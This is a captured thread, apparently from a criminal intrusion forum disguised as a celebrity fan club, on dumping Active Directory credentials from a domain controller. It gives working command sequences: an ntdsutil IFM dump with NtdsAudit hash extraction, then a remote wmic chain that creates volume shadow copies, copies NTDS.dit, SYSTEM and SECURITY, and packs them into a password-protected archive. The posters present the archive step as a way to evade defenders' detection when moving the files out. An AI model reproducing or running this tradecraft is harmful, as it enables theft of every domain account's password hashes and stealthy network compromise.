@@ -1,0 +1,123 @@
+
+
+    Vampir
+    Новые темы
+    Новые ответы
+
+    Начало
+    Помощь
+    Поиск
+    Профиль
+    Личные сообщения
+    Пользователи
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Privilege Escalation »
+    NTDS Dumping
+
+NTDS Dumping
+Rozetka · 2 · 97
+« предыдущая тема следующая тема »
+
+Страницы: 1
+Rozetka
+
+    Administrator
+    Member
+    *****
+        35
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+: Февраля 11, 2021, 03:06:00 pm
+Записан
+
+on PDC RUN from SYS / ADMIN
+Цитировать
+
+    ntdsutil "ac i ntds" "ifm" "create full c:\windows\temp\Crashpad\Temp\abc" q q
+
+
+
+and use for decrypt
+Код: [Выделить]
+
+https://github.com/Dionach/NtdsAudit
+
+Цитировать
+
+    ntdsaudit ntds.dit -s SYSTEM -p pwdump.txt -u users.csv
+
+5 sec and you get all hashes
+vjyh!
+
+Какая альтернатива ЕЩЕ ТИШЕ ?
+
+t3chnolog
+
+    Administrator
+    Member
+    *****
+        1
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+Ответ #1 : Февраля 19, 2021, 03:15:50 pm
+Записан
+
+Код: [Выделить]
+
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin list shadows >> c:\log.txt"
+
+
+делаем запрос на листинг шэдоу копий, там есть указание даты, проверьте чтобы была свежая дата
+почти наверняка они там уже есть, если нет то делаем сами
+Код: [Выделить]
+
+net start Volume Shadow Copy
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
+
+
+далее в листинге шэдоу копий находим самую свежую
+Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55
+соответственно нам нужен номер копии для следующей команды
+Код: [Выделить]
+
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c:\temp\log\"
+
+
+в c:\temp\log\ должны упасть файлы ntds.dit / security / system
+берём портативный консольный 7з и пакуем в архив с паролем
+Код: [Выделить]
+
+7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD
+
+
+выкачиваем запароленный архив себе, если при декрипте файла нтдс получаем ошибку (файл повреждён), то делаем следующее
+Код: [Выделить]
+
+Esentutl /p C:\log\ntds.dit
+
+
+хитрость этого способа в том, что мы по факту ничего не дампим, мы просто берём и выкачиваем нтдс
+чтобы не спалиться тем что вытаскиваем именно нтдс мы пакуем его в запароленный архив
+
+если у вас траблы с тем, что палят и выкидывают из сети после дампа нтдс - пробуйте этот способ
+его спалить можно только самим фактом какой-то утекающей даты с КД, причём проанализировать что именно вы тащите не зная пароль от архива невозможно
+
+Страницы: 1
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Privilege Escalation »
+    NTDS Dumping
+
+Перейти в:
+ 
++ Быстрый ответ
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Разработанно с от SychO
+
+
